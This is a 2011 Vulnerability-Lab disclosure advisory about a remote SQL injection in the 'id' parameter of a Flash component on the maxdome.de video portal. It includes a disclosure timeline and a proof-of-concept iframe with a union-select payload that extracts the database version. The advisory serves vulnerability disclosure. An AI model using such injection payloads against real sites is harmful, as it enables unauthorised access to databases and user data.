Title:
======
Maxdome Website - SQL Injection Vulnerability


Date:
=====
2011-10-26


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=300


VL-ID:
=====
300


Introduction:
=============
maxdome ist das Video-on-Demand-Angebot der ProSiebenSat.1 Media. Das Pay-per-View-Angebot ist das größte und 
am meisten genutzte im europäischen Raum. Erhältlich sind aktuelle Filme und Serien, oftmals sogar vor der 
eigentlichen TV-Ausstrahlung im Free- oder Pay-TV sowie eine Vielzahl an Comedy-Inhalten, Dokumentationen, 
Sport- und Musikvideos.
 
(Copy of the Vendor Homepage: http://www.maxdome.com)


Abstract:
=========
Vulnerability-Lab researcher discovered a remote SQL Injection vulnerability on the famous Maxdome`s Portal (videothek) website.


Report-Timeline:
================
2010-12-14:	Vendor Notification
2011-05-07:	Vendor Response/Feedback
2011-09-03:	Vendor Fix/Patch  -> CHECK BY US!
2011-10-26:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Critical


Details:
========
A remote SQL Injection vulnerability is detected on MaxDomes Videothek Portal website. The vulnerability allows an remote attacker 
to inject own sql commands over the weak id param request. 
 
Vulnerable Module(s): 
           			[+] Home Flash Video Componente

Picture(s):			
				../sql1.png


Proof of Concept:
=================
The sql injection vulnerability can be exploited by remote attackers. For demonstration or reproduce ...

Path:   		/php-bin/functions/home_flash/
File:  			homeflash.swf
Para:			?id=


<html><head><body>
<title>MaxDome - Remote SQL Injection PoC</title>
<br><br>
<b>Version</b>
<iframe src=http://www.maxdome.de/php-bin/functions/home_flash/homeflash.swf?id=-
1+union+select+1,2,3,4,5,6,7,8,9,10,11,12,@@version,14,15,16,17,18,19,20,21,22,23,24,25,26,27,
28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45--+ width=800 height=800>
<br><br>
</body></head></html>


Reference(s):
http://www.maxdome.de/php-bin/functions/home_flash/homeflash.swf?id=-
1+union+select+1,2,3,4,5,6,7,8,9,10,11,12,@@version,14,15,16,17,18,19,20,21,22,23,24,25,26,27,
28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45--+


Risk:
=====
The security risk of the sql injection vulnerability is estimated as critical.


Credits:
========
Vulnerability Research Laboratory -  N/A  Anonymous


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab or its suppliers.

    						Copyright © 2011|Vulnerability-Lab




-- 
Website: www.vulnerability-lab.com ; vuln-lab.com or vuln-db.com
Contact: admin@vulnerability-lab.com or support@vulnerability-lab.com


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
